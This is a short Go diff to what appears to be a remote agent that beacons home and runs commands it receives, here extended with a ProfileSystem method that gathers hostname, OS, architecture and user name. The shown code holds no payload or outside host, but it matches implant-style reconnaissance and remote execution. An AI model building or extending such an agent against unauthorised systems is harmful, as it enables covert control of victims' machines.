@@ -33,6 +33,13 @@ type BeaconData struct {
 	OS       string `json:"os"`
 }
 
+type SystemProfile struct {
+	Hostname string `json:"hostname"`
+	OS       string `json:"os"`
+	Arch     string `json:"arch"`
+	User     string `json:"user"`
+}
+
 func (a *Agent) Beacon() error {
 	hostname, err := os.Hostname()
 	if err != nil {
@@ -89,4 +96,18 @@ func (a *Agent) ExecuteCommand(cmd string) (string, error) {
 	command := exec.CommandContext(ctx, args[0], args[1:]...)
 	out, err := command.CombinedOutput()
 	return string(out), err
+}
+
+func (a *Agent) ProfileSystem() (*SystemProfile, error) {
+	hostname, _ := os.Hostname()
+	user := os.Getenv("USER")
+	if user == "" {
+		user = "unknown"
+	}
+	return &SystemProfile{
+		Hostname: hostname,
+		OS:       runtime.GOOS,
+		Arch:     runtime.GOARCH,
+		User:     user,
+	}, nil
 }
